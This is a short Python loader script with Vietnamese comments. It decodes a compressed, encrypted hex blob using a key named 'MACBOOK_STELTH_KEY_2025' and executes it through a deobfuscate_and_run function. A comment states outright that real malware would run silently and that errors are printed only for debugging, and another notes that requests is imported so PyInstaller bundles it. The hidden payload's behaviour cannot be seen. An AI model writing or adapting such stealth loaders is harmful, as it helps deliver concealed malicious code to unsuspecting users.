import os
import sys
import requests # Để PyInstaller đóng gói thư viện
from core.deobfuscator import deobfuscate_and_run

# DÁN CHUỖI HEX DÀI BẠN VỪA COPY VÀO ĐÂY
HEX_BLOB = "789c1dcc5b6f9a500000e07a98c011c48a088a8a17f078a20769ab2d8c4b9a2deb439fdbd86deac39aa656cd3650575ca1f5af37e9f7033e81581784dd205b615cfb1413b482d39b97835789a4737286c7365609611b9781724826afcc8eefb630a88ba336077c3f9f0ee9d5fd3c8591c1a1e724e0ca236b61744bb162afc1cf1f650fb8541bf6a1c9330d4e237cb1482d67f1588f789dec45640fd436557588fb3bbd7ebaaf8dd5103a9692359bcd8627b3bce946ffbfa4d992d552f2a62f89ff4c716fb1a4e224db9026d5a249b31b0ca9483f29c04bd47cbc5aae169dfc11d526480e9ab2e00f10c4b233bf4b9e7994cb081828550749c0f0f78a5e9a6dbe4dde8e09d7e9255eadbc3d32c31e6db9fdc396fe9a19d0bb4c2d8735257db50bbda02e08d3348a5b2dc9d5c9e99f072d968d7e451bc817e1fcf611e53eeeca6a083b9a11d4d375f6d777f0570dc76a9ad73d69745ef8acadc5b88027bbf9db2700ba3403ed9305cbbc034e8449f4" 

SECRET_KEY = b"MACBOOK_STELTH_KEY_2025"

def main():
    try:
        # Chuyển ngược từ HEX sang BYTES trước khi giải mã
        obfuscated_blob = bytes.fromhex(HEX_BLOB)
        
        # Thực thi
        deobfuscate_and_run(obfuscated_blob, SECRET_KEY)
        
    except Exception as e:
        # Trong thực tế malware sẽ im lặng, nhưng để debug ta in ra lỗi
        print(f"Lỗi thực thi: {e}")

if __name__ == "__main__":
    main()